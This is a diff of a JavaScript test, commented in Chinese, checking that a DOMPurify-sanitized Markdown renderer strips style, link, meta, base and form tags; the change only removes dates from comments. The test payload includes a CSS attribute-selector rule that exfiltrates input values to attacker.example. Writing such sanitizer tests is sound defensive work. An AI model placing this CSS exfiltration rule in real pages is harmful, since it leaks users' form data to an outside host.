@@ -55,12 +55,12 @@ describe('renderMarkdown — 生产路径（DOMPurify 消毒激活）', () => {
     // 载荷必须 mid-body（正文在前、载荷在后）——题面天然形态，也是 marked
     // 的真实输出位置。置于片段开头时 <style> 被 HTML 解析器归入 <head>，
     // WHOLE_DOCUMENT=false 只处理 body，元素静默消失只是**位置伪象**而非
-    // 白名单剥除（2026-11-05 评审轮 4 实测：leading 剥除、mid-body 存活）。
+    // 白名单剥除（实测：leading 剥除、mid-body 存活）。
     // 机制分工：<style> 由 FORBID_TAGS 显式禁（html 档白名单实际含 style）；
     // <link>/<meta>/<base> 不在档内、白名单剥；<form> 由 FORBID_TAGS 显式禁
     // （html 档白名单含 form 且**外域 action 原样保留**——拦截器只拦锚点、
     // Rust 无 on_navigation，外域提交被 CSP form-action 拦下后残余是整页重载
-    // 丢草稿，2026-11-06 评审轮 6 实测）。危害面：伪造弹窗、CSS 外泄、远程
+    // 丢草稿，实测）。危害面：伪造弹窗、CSS 外泄、远程
     // 样式表、导航劫持、表单提交。未来若移除 FORBID_TAGS 或误放行，本用例即红。
     const payload = [
       '<style>input[value^=a]{background:url(http://attacker.example/a)}</style>',
